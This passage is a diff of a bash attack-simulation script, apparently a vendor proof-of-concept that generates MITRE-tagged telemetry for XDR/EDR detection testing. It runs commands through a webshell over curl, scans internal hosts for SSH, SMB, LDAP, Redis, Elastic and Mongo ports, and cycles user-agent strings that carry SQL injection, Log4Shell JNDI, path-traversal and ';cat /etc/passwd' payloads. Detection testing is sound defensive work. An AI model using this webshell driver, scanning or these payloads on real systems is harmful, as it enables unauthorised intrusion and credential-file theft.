   outfile=\"\${SCAN_DIR}/\${file}.\${hosttag}\"
-  poc_port_probe \"\${h}\" \"\${port}\" && echo \"\${h}\" >> \"\${outfile}\"
+  poc_port_probe \"\${h}\" \"\${port}\" && echo \"\${h}:\${port}\" >> \"\${outfile}\"
 done
 ' _ {}"
     else
@@ -1341,11 +1997,11 @@ done
   [ \"\${i}\" -lt ${start} ] && continue
   h=\"\${NP}.\${i}\"
   hosttag=\"\$(echo \"\${h}\" | tr . _)\"
-  for spec in 22:ssh_hosts.txt 53:dns_hosts.txt 80:http_targets.txt 443:https_targets.txt 445:smb_hosts.txt 389:ldap_hosts.txt 8080:http_targets.txt 8443:https_targets.txt 6379:redis_hosts.txt 9200:elastic_hosts.txt 27017:mongo_hosts.txt; do
+  for spec in ${port_specs}; do
     port=\"\${spec%%:*}\"
     file=\"\${spec#*:}\"
     outfile=\"\${SCAN_DIR}/\${file}.\${hosttag}\"
-    poc_port_probe \"\${h}\" \"\${port}\" && echo \"\${h}\" >> \"\${outfile}\"
+    poc_port_probe \"\${h}\" \"\${port}\" && echo \"\${h}:\${port}\" >> \"\${outfile}\"
   done
 done"
     fi
@@ -1373,7 +2029,11 @@ append_parse_nmap_gnmap() {
 import os,re
 src="${gnmap_path}"
 rd="${REMOTE_RUNTIME_DIR}"
-maps={22:"ssh_hosts.txt",53:"dns_hosts.txt",80:"http_targets.txt",443:"https_targets.txt",445:"smb_hosts.txt",389:"ldap_hosts.txt",8080:"http_targets.txt",8443:"https_targets.txt",6379:"redis_hosts.txt",9200:"elastic_hosts.txt",27017:"mongo_hosts.txt"}
+http_ports={80,5000,5001,7001,7002,8000,8008,8080,8081,8082,8088,8888,9000,9090,10000}
+https_ports={443,8443,9443,10443}
+maps={22:"ssh_hosts.txt",53:"dns_hosts.txt",445:"smb_hosts.txt",389:"ldap_hosts.txt",6379:"redis_hosts.txt",9200:"elastic_hosts.txt",27017:"mongo_hosts.txt"}
+for p in http_ports: maps[p]="http_targets.txt"
+for p in https_ports: maps[p]="https_targets.txt"
 if os.path.exists(src):
     fhs={p:open(os.path.join(rd,n),"a",encoding="utf-8") for p,n in maps.items()}
     for line in open(src,encoding="utf-8",errors="ignore"):
@@ -1383,14 +2043,16 @@ if os.path.exists(src):
         ip=parts[1]
         for mp in re.findall(r"(\\d+)/open",line):
             p=int(mp)
-            if p in fhs: fhs[p].write(ip+"\\n")
+            if p in fhs:
+                if p in http_ports or p in https_ports: fhs[p].write(f"{ip}:{p}\\n")
+                else: fhs[p].write(ip+"\\n")
     for fh in fhs.values(): fh.close()
 PY
 )
         run_remote_python "parse-nmap-${gnmap_path##*/}" "${parser_py}"
     else
         run_webshell_quick "parse-nmap-${gnmap_path##*/}" \
-            "test -f '${gnmap_path}' && awk '/Ports:/{ip=\$2; if(\$0~/(22\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/ssh_hosts.txt\"; if(\$0~/(53\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/dns_hosts.txt\"; if(\$0~/(80\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(443\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/https_targets.txt\"; if(\$0~/(445\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/smb_hosts.txt\"; if(\$0~/(389\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/ldap_hosts.txt\"; if(\$0~/(8080\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(8443\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/https_targets.txt\"; if(\$0~/(6379\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/redis_hosts.txt\"; if(\$0~/(9200\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/elastic_hosts.txt\"; if(\$0~/(27017\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/mongo_hosts.txt\"}' '${gnmap_path}' || true"
+            "test -f '${gnmap_path}' && awk '/Ports:/{ip=\$2; if(\$0~/(22\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/ssh_hosts.txt\"; if(\$0~/(53\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/dns_hosts.txt\"; if(\$0~/(80\\/open)/) print ip\":80\" >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(443\\/open)/) print ip\":443\" >> \"${REMOTE_RUNTIME_DIR}/https_targets.txt\"; if(\$0~/(5000\\/open)/) print ip\":5000\" >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(5001\\/open)/) print ip\":5001\" >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(7001\\/open)/) print ip\":7001\" >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(7002\\/open)/) print ip\":7002\" >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(8000\\/open)/) print ip\":8000\" >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(8008\\/open)/) print ip\":8008\" >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(8080\\/open)/) print ip\":8080\" >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(8081\\/open)/) print ip\":8081\" >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(8082\\/open)/) print ip\":8082\" >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(8088\\/open)/) print ip\":8088\" >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(8443\\/open)/) print ip\":8443\" >> \"${REMOTE_RUNTIME_DIR}/https_targets.txt\"; if(\$0~/(8888\\/open)/) print ip\":8888\" >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(9000\\/open)/) print ip\":9000\" >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(9090\\/open)/) print ip\":9090\" >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(9443\\/open)/) print ip\":9443\" >> \"${REMOTE_RUNTIME_DIR}/https_targets.txt\"; if(\$0~/(10000\\/open)/) print ip\":10000\" >> \"${REMOTE_RUNTIME_DIR}/http_targets.txt\"; if(\$0~/(10443\\/open)/) print ip\":10443\" >> \"${REMOTE_RUNTIME_DIR}/https_targets.txt\"; if(\$0~/(445\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/smb_hosts.txt\"; if(\$0~/(389\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/ldap_hosts.txt\"; if(\$0~/(6379\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/redis_hosts.txt\"; if(\$0~/(9200\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/elastic_hosts.txt\"; if(\$0~/(27017\\/open)/) print ip >> \"${REMOTE_RUNTIME_DIR}/mongo_hosts.txt\"}' '${gnmap_path}' || true"
     fi
 }
 
@@ -1401,6 +2063,14 @@ dedupe_remote_host_files() {
 }
 
 discovery_port_to_file() {
+    local file=""
+    if declare -F http_discovery_port_target_file >/dev/null 2>&1; then
+        file=$(http_discovery_port_target_file "$1")
+        if [[ -n "${file}" ]]; then
+            printf '%s' "${file}"
+            return 0
+        fi
+    fi
     case "$1" in
         22) printf '%s' "ssh_hosts.txt" ;;
         53) printf '%s' "dns_hosts.txt" ;;
@@ -1427,10 +2097,14 @@ dedupe_discovery_local_cache() {
 }
 
 discovery_cache_append_host() {
-    local host="$1" port="$2" file cache
+    local host="$1" port="$2" file cache entry
+    entry="${host}"
     file=$(discovery_port_to_file "${port}")
     [[ -z "${file}" ]] && return 0
-    discovery_local_cache_append "${host}" "${file}"
+    case "${file}" in
+        http_targets.txt|https_targets.txt) entry="${host}:${port}" ;;
+    esac
+    discovery_local_cache_append "${entry}" "${file}"
 }
 
 discovery_local_cache_append() {
@@ -1446,7 +2120,7 @@ discovery_local_cache_append() {
 count_discovered_ips_in_file() {
     local cache="$1" n
     [[ -n "${cache}" && -f "${cache}" && -s "${cache}" ]] || { echo 0; return 0; }
-    n=$(awk '/^[0-9]+\./ {print $1}' "${cache}" | safe_count_lines)
+    n=$(extract_host_file_lines < "${cache}" | safe_count_lines)
     safe_int "${n}"
 }
 
@@ -1465,6 +2139,14 @@ discovery_parse_nmap_stdout() {
 }
 
 discovery_nmap_ports_spec() {
+    if fast_safe_mode_enabled; then
+        fast_safe_discovery_ports_csv
+        return 0
+    fi
+    if declare -F http_discovery_nmap_ports_with_services_csv >/dev/null 2>&1; then
+        http_discovery_nmap_ports_with_services_csv
+        return 0
+    fi
     printf '%s' "22,53,80,443,445,389,8080,8443,6379,9200,27017"
 }
 
@@ -1690,14 +2372,22 @@ overlap_will_execute() {
 }
 
 overlap_plan_description() {
-    if [[ "${AUTO_OVERLAP}" != true ]]; then
-        echo "disabled"
-    elif [[ "${DRY_RUN}" == true ]]; then
-        echo "planned (beacon + dns in background when not dry-run)"
-    elif [[ -n "${SINGLE_STAGE}" ]]; then
-        echo "disabled (single-stage mode)"
+    if [[ "${OVERLAP_EXECUTED}" == true ]]; then
+        echo "workers executed (concurrent stages ran)"
+    elif [[ "${PIPELINE_OVERLAP}" == true ]]; then
+        echo "configured (pipeline overlap enabled)"
+    elif [[ "${AUTO_OVERLAP}" == true ]]; then
+        echo "scheduled (auto overlap enabled)"
     else
-        echo "active (beacon + dns run in background during pipeline)"
+        echo "disabled"
+    fi
+}
+
+overlap_auto_description() {
+    if [[ "${AUTO_OVERLAP}" == true ]]; then
+        echo "true"
+    else
+        echo "false"
     fi
 }
 
@@ -1756,7 +2446,7 @@ _webshell_invoke() {
     local context="$1"
     local payload="$2"
     local mode="${3:-normal}"
-    local wrapped saved_wrap body http_code payload_bytes curl_max=25 rc=0
+    local wrapped saved_wrap body http_code payload_bytes curl_max=25 rc=0 t0 t1
 
     validate_remote_command_isolation "${payload}" || return 1
     payload_bytes=${#payload}
@@ -1765,14 +2455,15 @@ _webshell_invoke() {
     if [[ "${mode}" == "bootstrap" ]]; then
         REMOTE_WRAP_READY=false
     fi
-    wrapped=$(wrap_remote_payload "${payload}")
+    wrapped=$(wrap_remote_payload "${payload}" "${mode}")
     REMOTE_WRAP_READY="${saved_wrap}"
-    if [[ "${VERBOSE}" == true ]]; then
+    if [[ "${VERBOSE}" == true || "${DEBUG}" == true ]]; then
         vlog "Remote context=${context} mode=${mode} bytes=${payload_bytes}"
-        vlog "Remote payload=${payload}"
+        [[ "${DEBUG}" == true ]] && vlog "Remote payload=${payload}"
     fi
     if [[ "${DRY_RUN}" == true ]]; then
-        echo "[DRY-RUN:${context}] ${payload}"
+        echo "$(log_console_prefix)[DRY-RUN:${context}] ${payload}"
+        WEBSHELL_LAST_EXIT_CODE=0
         return 0
     fi
     case "${mode}" in
@@ -1782,13 +2473,16 @@ _webshell_invoke() {
         *) curl_max=25 ;;
     esac
     build_curl_common_args "${curl_max}"
-    local args=("${CURL_COMMON_ARGS[@]}")
-    if [[ "${WEBSHELL_METHOD}" == "GET" ]]; then
+    local args=("${CURL_COMMON_ARGS[@]}") transport
+    transport=$(webshell_transport_for_payload "${context}" "${payload_bytes}")
+    WEBSHELL_METHOD="${transport}"
+    if [[ "${transport}" == "GET" ]]; then
         args+=(--get --data-urlencode "cmd=${wrapped}")
     else
         args+=(--data-urlencode "cmd=${wrapped}")
     fi
 
+    t0=$(date +%s)
     if [[ -n "${WEBSHELL_LOCK_FILE}" && -e "${WEBSHELL_LOCK_FILE}" ]] && command -v flock >/dev/null 2>&1; then
         body=$( (
             flock -w 120 9 || exit 124
@@ -1797,23 +2491,34 @@ _webshell_invoke() {
     else
         body=$(curl "${args[@]}" -w $'\n%{http_code}' "${WEB_SHELL_URL}" 2>/dev/null || printf '\n000') || rc=$?
     fi
+    t1=$(date +%s)
+    WEBSHELL_LAST_EXEC_MS=$(( (t1 - t0) * 1000 ))
     http_code="${body##*$'\n'}"
     body="${body%$'\n'*}"
     WEBSHELL_LAST_HTTP_CODE="${http_code}"
     body=$(normalize_webshell_response "${body}")
+    WEBSHELL_LAST_EXIT_CODE=""
+    if [[ "${body}" == *"__EXIT_CODE:"* ]]; then
+        WEBSHELL_LAST_EXIT_CODE=$(sed -n 's/.*__EXIT_CODE:\([0-9][0-9]*\).*/\1/p' <<< "${body}" | tail -n1)
+        body=$(sed '/__EXIT_CODE:/d' <<< "${body}")
+    fi
+    WEBSHELL_LAST_EXIT_CODE=$(safe_int "${WEBSHELL_LAST_EXIT_CODE}")
 
     if (( rc == 124 )); then
         log_message "WARN" "Webshell lock timeout (120s) at context=${context}"
         add_fallback_usage "Webshell lock timeout at context=${context}"
         return 124
     fi
-    if [[ "${VERBOSE}" == true ]]; then
-        vlog "Webshell method=${WEBSHELL_METHOD} http=${http_code:-000} response_bytes=${#body}"
+    if [[ "${VERBOSE}" == true || "${DEBUG}" == true ]]; then
+        vlog "Webshell method=${WEBSHELL_METHOD} http=${http_code:-000} response_bytes=${#body} exit=${WEBSHELL_LAST_EXIT_CODE} ms=${WEBSHELL_LAST_EXEC_MS}"
     fi
     if [[ -z "${http_code}" || "${http_code}" == "000" ]]; then
         WEBSHELL_SLOW=true
         log_message "WARN" "Webshell request failed (${context}, HTTP ${http_code:-000})"
         add_fallback_usage "Webshell transport issue at context=${context} (HTTP ${http_code:-000})"
+    fi
+    if declare -F poc_obs_webshell_hook >/dev/null 2>&1; then
+        poc_obs_webshell_hook "${context}" "${payload}" "${body}" "${http_code}" "${WEBSHELL_LAST_EXIT_CODE}" "${WEBSHELL_LAST_EXEC_MS}" || true
     fi
     printf '%s' "${body}"
 }
@@ -1837,29 +2542,26 @@ run_remote_python_capture() {
 }
 
 write_report_entries() {
-    local stage="$1" mitre="$2" src="$3" telemetry="$4" target="$5" status="$6" ctx="$7" ts cycle_num
+    local stage="$1" mitre="$2" src="$3" telemetry="$4" target="$5" status="$6" ctx="$7" ts_human cycle_num detail
     status=$(normalize_stage_status "${status}")
-    ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ" 2>/dev/null || date +"%Y-%m-%dT%H:%M:%SZ")
-    cycle_num="${CURRENT_CYCLE:-1}"
     [[ "${DRY_RUN}" == true ]] && return 0
-    [[ -n "${TIMELINE_LOG}" ]] && safe_append_file "${TIMELINE_LOG}" \
-        "${ts} campaign=${CAMPAIGN_ID} cycle=${cycle_num} stage=${stage} mitre=${mitre} src=${src} type=${telemetry} target=${target} status=${status} ctx=\"${ctx}\""
-    if [[ -n "${MITRE_CSV}" ]] && [[ ! -f "${MITRE_CSV}" ]]; then
-        safe_write_file "${MITRE_CSV}" "Timestamp,Cycle,Stage,MITRE,Source,Telemetry,Target,Status" || true
-    fi
-    [[ -n "${MITRE_CSV}" ]] && safe_append_file "${MITRE_CSV}" \
-        "${ts},${cycle_num},${stage},${mitre},${src},${telemetry},${target},${status}"
-    if [[ -n "${REPORT_MD}" ]] && [[ ! -f "${REPORT_MD}" ]]; then
-        safe_write_file "${REPORT_MD}" "# Stellar Cyber PoC Attack Chain Report
-**Campaign ID:** ${CAMPAIGN_ID}
-**Mode/Profile:** ${MODE}/${PROFILE}
+    ts_human=$(date +"%Y-%m-%d %H:%M:%S")
+    cycle_num="${CURRENT_CYCLE:-1}"
+    detail="cycle=${cycle_num} src=${src} — ${ctx}"
+    if declare -F poc_obs_report_stage_event >/dev/null 2>&1; then
+        poc_obs_init_artifacts 2>/dev/null || true
+        poc_obs_report_stage_event "${ts_human}" "${stage}" "${mitre}" "${telemetry}" "${target}" "${status}" "${detail}"
+    elif [[ -n "${REPORT_MD}" ]]; then
+        if [[ ! -f "${REPORT_MD}" ]]; then
+            safe_write_file "${REPORT_MD}" "# Stellar PoC Report
 
-| Timestamp | Cycle | Stage | MITRE | Source | Telemetry | Status |
+| Time | Stage | MITRE | Telemetry | Target | Status | Detail |
 |---|---|---|---|---|---|---|
 " || true
+        fi
+        safe_append_file "${REPORT_MD}" "| ${ts_human} | ${stage} | ${mitre} | ${telemetry} | ${target} | ${status} | ${detail} |"
     fi
-    [[ -n "${REPORT_MD}" ]] && safe_append_file "${REPORT_MD}" \
-        "| ${ts} | ${cycle_num} | ${stage} | ${mitre} | ${src} | ${telemetry} | ${status} |"
+    log_message "INFO" "Stage ${stage}: ${status} — ${telemetry} target=${target} (${detail})"
 }
 
 execute_jitter() {
@@ -1903,6 +2605,7 @@ cleanup_ephemeral_runtime() {
     if [[ "${KEEP_ARTIFACTS}" == true ]]; then
         return 0
     fi
+    cleanup_edr_static_test_on_exit 2>/dev/null || true
     if [[ "${CLEANUP_RUNTIME_ON_EXIT}" != true || -z "${REMOTE_RUNTIME_DIR}" ]]; then
         return 0
     fi
@@ -1957,7 +2660,7 @@ wait_overlap_jobs() {
 
 assess_remote_capabilities() {
     log_message "STAGE" "Remote dependency assessment"
-    local bins=("bash" "timeout" "seq" "awk" "nmap" "smbclient" "rpcclient" "ldapsearch" "redis-cli" "mongosh" "mongo" "nc" "ssh" "curl" "python3" "getent" "nslookup" "dig" "ping" "base64" "openssl")
+    local bins=("bash" "timeout" "seq" "awk" "nmap" "smbclient" "rpcclient" "ldapsearch" "redis-cli" "mongosh" "mongo" "nc" "ssh" "curl" "python3" "getent" "nslookup" "dig" "host" "ping" "base64" "openssl")
     local b out v
     if [[ "${DRY_RUN}" == true ]]; then
         for b in "${bins[@]}"; do
@@ -1975,10 +2678,20 @@ assess_remote_capabilities() {
         v="HAS_${b//-/_}"
         if [[ -n "${out}" ]]; then
             declare -g "${v}=true"
-            add_dependency_status "${b}: detected"
+            if [[ "${b}" == "ping" ]]; then
+                REMOTE_PING_PATH="${out}"
+                add_dependency_status "ping: detected path=${REMOTE_PING_PATH}"
+            else
+                add_dependency_status "${b}: detected"
+            fi
         else
             declare -g "${v}=false"
-            add_dependency_status "${b}: missing"
+            if [[ "${b}" == "ping" ]]; then
+                REMOTE_PING_PATH=""
+                add_dependency_status "ping: missing"
+            else
+                add_dependency_status "${b}: missing"
+            fi
         fi
     done
     select_remote_shell_bin
@@ -1989,21 +2702,29 @@ assess_remote_capabilities() {
 }
 
 discovery_sync_remote_host_file() {
-    local file="$1" raw cache tmp
+    local file="$1" raw cache tmp cached_backup remote_lines
     [[ -z "${file}" || -z "${LOCAL_STATE_DIR}" ]] && { echo 0; return 0; }
     cache="${LOCAL_STATE_DIR}/remote_hosts/${file}"
     mkdir -p "${LOCAL_STATE_DIR}/remote_hosts" 2>/dev/null || true
+    cached_backup=""
+    if [[ -f "${cache}" ]]; then
+        cached_backup=$(extract_host_file_lines < "${cache}")
+    fi
     raw=$(run_webshell_quick "sync-${file}" \
         "if [ -f '${REMOTE_RUNTIME_DIR}/${file}' ]; then cat '${REMOTE_RUNTIME_DIR}/${file}'; fi" 2>/dev/null || true)
     raw=$(normalize_webshell_response "${raw}")
     tmp=$(mktemp)
-    awk '/^[0-9]+\./ {print $1}' <<< "${raw}" > "${tmp}"
-    if [[ -s "${cache}" ]]; then
-        awk '/^[0-9]+\./ {print $1}' "${cache}" >> "${tmp}"
-    fi
-    if [[ -s "${tmp}" ]]; then
+    remote_lines=$(printf '%s\n' "${raw}" | extract_host_file_lines)
+    if [[ -n "${remote_lines}" ]]; then
+        printf '%s\n' "${remote_lines}" > "${tmp}"
+        if [[ -n "${cached_backup}" ]]; then
+            printf '%s\n' "${cached_backup}" >> "${tmp}"
+        fi
         sort -u "${tmp}" -o "${cache}"
-    elif [[ ! -s "${cache}" ]]; then
+    elif [[ -n "${cached_backup}" ]]; then
+        add_fallback_usage "discovery_sync: remote ${file} empty — kept local cache"
+        printf '%s\n' "${cached_backup}" > "${cache}"
+    elif [[ ! -f "${cache}" ]]; then
         : > "${cache}"
     fi
     rm -f "${tmp}"
@@ -2034,19 +2755,49 @@ discovery_probe_one_port() {
 discovery_probe_host_ports() {
     local host="$1" last probe_out line port_spec port file
     last="${host##*.}"
-    log_message "OK" "Direct TCP probe on ${host} from webshell (22/80/443/445/8080; nc/bash)"
+    log_message "OK" "Direct TCP probe on ${host} from webshell (expanded web + core service ports; nc/bash)"
     probe_out=""
     for port_spec in \
         "22:ssh_hosts.txt" \
-        "80:http_targets.txt" \
-        "443:https_targets.txt" \
+        "53:dns_hosts.txt" \
         "445:smb_hosts.txt" \
-        "8080:http_targets.txt"; do
+        "389:ldap_hosts.txt" \
+        "6379:redis_hosts.txt" \
+        "9200:elastic_hosts.txt" \
+        "27017:mongo_hosts.txt"; do
         port="${port_spec%%:*}"
         file="${port_spec#*:}"
         line=$(discovery_probe_one_port "${host}" "${port}" "${file}")
         [[ -n "${line}" ]] && probe_out+="${line}"$'\n'
     done
+    if fast_safe_mode_enabled; then
+        while IFS= read -r port; do
+            [[ -z "${port}" ]] && continue
+            file=$(fast_safe_discovery_port_target_file "${port}")
+            [[ -z "${file}" ]] && continue
+            line=$(discovery_probe_one_port "${host}" "${port}" "${file}")
+            [[ -n "${line}" ]] && probe_out+="${line}"$'\n'
+        done < <(fast_safe_discovery_all_ports)
+    elif declare -F http_discovery_all_ports >/dev/null 2>&1; then
+        while IFS= read -r port; do
+            [[ -z "${port}" ]] && continue
+            file=$(discovery_port_to_file "${port}")
+            [[ -z "${file}" ]] && continue
+            line=$(discovery_probe_one_port "${host}" "${port}" "${file}")
+            [[ -n "${line}" ]] && probe_out+="${line}"$'\n'
+        done < <(http_discovery_all_ports)
+    else
+        for port_spec in \
+            "80:http_targets.txt" \
+            "443:https_targets.txt" \
+            "8080:http_targets.txt" \
+            "8443:https_targets.txt"; do
+            port="${port_spec%%:*}"
+            file="${port_spec#*:}"
+            line=$(discovery_probe_one_port "${host}" "${port}" "${file}")
+            [[ -n "${line}" ]] && probe_out+="${line}"$'\n'
+        done
+    fi
     probe_out+="$(run_webshell_long "probe-${last}-done" "echo DISCOVERY_PROBE_DONE host=${host}" 2>/dev/null || true)"
     probe_out=$(normalize_webshell_response "${probe_out}")
     discovery_parse_probe_stdout "${host}" "${probe_out}"
@@ -2059,15 +2810,31 @@ discovery_probe_host_ports() {
     fi
 }
 
+extract_host_file_lines() {
+  awk '
+    /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {
+      line = $0
+      gsub(/^[[:space:]]+|[[:space:]]+$/, "", line)
+      if (line ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/) print line
+    }'
+}
+
 get_local_hosts() {
-    local file="$1" out cmd cache
+    local file="$1" out cmd cache cached_backup mapped
     [[ -z "${file}" || -z "${LOCAL_STATE_DIR}" ]] && return 0
     cache="${LOCAL_STATE_DIR}/remote_hosts/${file}"
     if [[ "${DRY_RUN}" == true ]]; then
         case "${file}" in
             ssh_hosts.txt) printf '%s\n' "10.10.10.10" "10.10.10.20" ;;
-            http_targets.txt) printf '%s\n' "10.10.10.30" "10.10.10.40" ;;
-            https_targets.txt) printf '%s\n' "10.10.10.50" ;;
+            http_targets.txt|usable_http_targets.txt) printf '%s\n' "10.10.10.30:80" "10.10.10.40:8080" ;;
+            https_targets.txt|usable_https_targets.txt) printf '%s\n' "10.10.10.50:443" ;;
+            reachable_http_targets.txt|reachable_https_targets.txt)
+                if [[ -s "${cache}" ]]; then
+                    extract_host_file_lines < "${cache}"
+                fi
+                return 0
+                ;;
+            alive_hosts.txt) printf '%s\n' "10.10.10.30" "10.10.10.40" "10.10.10.50" ;;
             smb_hosts.txt) printf '%s\n' "10.10.10.60" ;;
             ldap_hosts.txt) printf '%s\n' "10.10.10.70" ;;
             redis_hosts.txt) printf '%s\n' "10.10.10.80" ;;
@@ -2078,15 +2845,29 @@ get_local_hosts() {
         esac
         return 0
     fi
-    if [[ -s "${cache}" ]]; then
-        awk '/^[0-9]+\./ {print $1}' "${cache}"
+    cached_backup=""
+    if [[ -f "${cache}" ]]; then
+        cached_backup=$(extract_host_file_lines < "${cache}")
+    fi
+    if [[ -n "${cached_backup}" ]]; then
+        printf '%s\n' "${cached_backup}"
         return 0
     fi
     printf -v cmd "if [ -f %q ]; then cat %q; fi" "${REMOTE_RUNTIME_DIR}/${file}" "${REMOTE_RUNTIME_DIR}/${file}"
     out=$(run_webshell_quick "read-${file}" "${cmd}")
     out=$(normalize_webshell_response "${out}")
     mkdir -p "${LOCAL_STATE_DIR}/remote_hosts" 2>/dev/null || true
-    awk '/^[0-9]+\./ {print $1}' <<< "${out}" | sort -u | tee "${cache}"
+    mapped=$(printf '%s\n' "${out}" | extract_host_file_lines | sort -u)
+    if [[ -z "${mapped}" ]]; then
+        if [[ -n "${cached_backup}" ]]; then
+            add_fallback_usage "get_local_hosts: remote read of ${file} returned empty — kept existing local cache"
+            printf '%s\n' "${cached_backup}"
+            return 0
+        fi
+        return 0
+    fi
+    printf '%s\n' "${mapped}" | tee "${cache}" >/dev/null
+    printf '%s\n' "${mapped}"
 }
 
 stage_runtime_validation() {
@@ -2142,7 +2923,14 @@ stage_preflight_validation() {
     add_executed_stage "Preflight Validation"
     write_report_entries "preflight_validation" "T1190" "XDR/NDR/EDR" "Environment Validation" "local+remote" "start" "poc preflight checks"
     if [[ "${DRY_RUN}" == true ]]; then
+        WEBSHELL_EFFECTIVE_METHOD="${WEBSHELL_USER_METHOD^^}"
+        [[ "${WEBSHELL_EFFECTIVE_METHOD}" == AUTO ]] && WEBSHELL_EFFECTIVE_METHOD=POST
+        WEBSHELL_METHOD="${WEBSHELL_EFFECTIVE_METHOD}"
+        WEBSHELL_POST_SUPPORTED=true
+        WEBSHELL_GET_SUPPORTED=true
+        WEBSHELL_TRANSPORT_DISCOVERED=true
         add_preflight_result "[+] Webshell reachable (simulated)"
+        add_preflight_result "[+] Webshell transport effective=${WEBSHELL_EFFECTIVE_METHOD} (simulated)"
         add_preflight_result "[+] Command execution confirmed (simulated)"
         add_preflight_result "[+] Runtime dir writable (simulated)"
         set_stage_result "Preflight Validation" "Success"
@@ -2155,10 +2943,16 @@ stage_preflight_validation() {
     if [[ -z "${status_code}" || "${status_code}" == "000" ]]; then
         add_preflight_result "[-] Webshell unreachable"
         set_stage_result "Preflight Validation" "Skipped" "Webshell unreachable"
-        log_message "ERROR" "Webshell unreachable"
-        exit 1
+        poc_fatal_exit "Webshell unreachable: ${WEB_SHELL_URL}"
     fi
     add_preflight_result "[+] Webshell reachable (HTTP ${status_code})"
+
+    if ! discover_webshell_transport; then
+        add_preflight_result "[-] Webshell transport discovery failed (POST and GET probes)"
+        set_stage_result "Preflight Validation" "Skipped" "Webshell transport discovery failed"
+        exit 1
+    fi
+    add_preflight_result "[+] Webshell transport auto: effective=${WEBSHELL_EFFECTIVE_METHOD} (user=${WEBSHELL_USER_METHOD})"
 
     token="STELLAR_POC_OK_${RANDOM}"
     if ! detect_webshell_command_style "${token}"; then
@@ -2239,6 +3033,385 @@ stage_post_assessment_validations() {
     else
         set_stage_result "Post-Assessment Validation" "${post_status}"
     fi
+}
+
+parse_webshell_scan_base_url() {
+    local url="$1" scheme="" authority="" hostport="" port="" base=""
+    url="${url%%#*}"
+    url="${url%%\?*}"
+    scheme="${url%%://*}"
+    authority="${url#*://}"
+    authority="${authority%%/*}"
+    hostport="${authority%%:*}"
+    if [[ "${authority}" == *:* ]]; then
+        port="${authority##*:}"
+    else
+        case "${scheme}" in
+            https) port=443 ;;
+            *) port=80 ;;
+        esac
+    fi
+    if [[ "${scheme}" == "https" && "${port}" == "443" ]] || [[ "${scheme}" == "http" && "${port}" == "80" ]]; then
+        base="${scheme}://${hostport}/"
+    else
+        base="${scheme}://${hostport}:${port}/"
+    fi
+    printf '%s\n' "${base}"
+}
+
+pre_webshell_pick_ua() {
+    local -a uas=(
+        'ReconEngine/5.4'
+        'ThreatHunterAgent/8.2'
+        'DiscoveryProbe/7.3'
+        'InternalAuditScanner/4.0'
+        'SecurityAssessmentClient/3.1'
+        "' OR 1=1--"
+        '${jndi:ldap://127.0.0.1/a}'
+        'spring.cloud.function.routing-expression'
+        '../../../../etc/passwd'
+        ';id'
+        'TelemetryCollector/9.7 select pg_sleep(3)'
+        'ReconEngine/5.4 ;cat /etc/passwd'
+    )
+    printf '%s' "${uas[RANDOM % ${#uas[@]}]}"
+}
+
+pre_webshell_classify_ua() {
+    local ua="$1"
+    case "${ua}" in
+        *ReconEngine*|*ThreatHunter*|*DiscoveryProbe*|*InternalAudit*|*SecurityAssessment*|*TelemetryCollector*)
+            printf 'rare'
+            ;;
+        *) printf 'payload' ;;
+    esac
+}
+
+pre_webshell_local_http_request() {
+    local url="$1" ua="$2" code="" out="" tls_arg=()
+    [[ "${url}" == https://* ]] && tls_arg=(-k)
+    if [[ "${LOCAL_HAS_CURL}" == true ]]; then
+        build_curl_common_args 3
+        code=$(curl "${CURL_COMMON_ARGS[@]}" "${tls_arg[@]}" -sS -o /dev/null -w '%{http_code}' -A "${ua}" \
+            -H "X-PoC-Campaign: ${CAMPAIGN_ID}" -H "X-PoC-Stage: pre-webshell-url-scan" \
+            --max-time 3 "${url}" 2>/dev/null || true)
+    elif command -v python3 >/dev/null 2>&1; then
+        code=$(python3 - "${url}" "${ua}" <<'PY' 2>/dev/null || true
+import sys, ssl, urllib.request
+url, ua = sys.argv[1], sys.argv[2]
+ctx = ssl.create_default_context()
+if url.startswith('https:'):
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+req = urllib.request.Request(url, headers={'User-Agent': ua})
+try:
+    with urllib.request.urlopen(req, timeout=3, context=ctx) as resp:
+        print(resp.status)
+except Exception as exc:
+    if hasattr(exc, 'code') and exc.code:
+        print(exc.code)
+    else:
+        print('000')
+PY
+)
+    else
+        printf '000'
+        return 1
+    fi
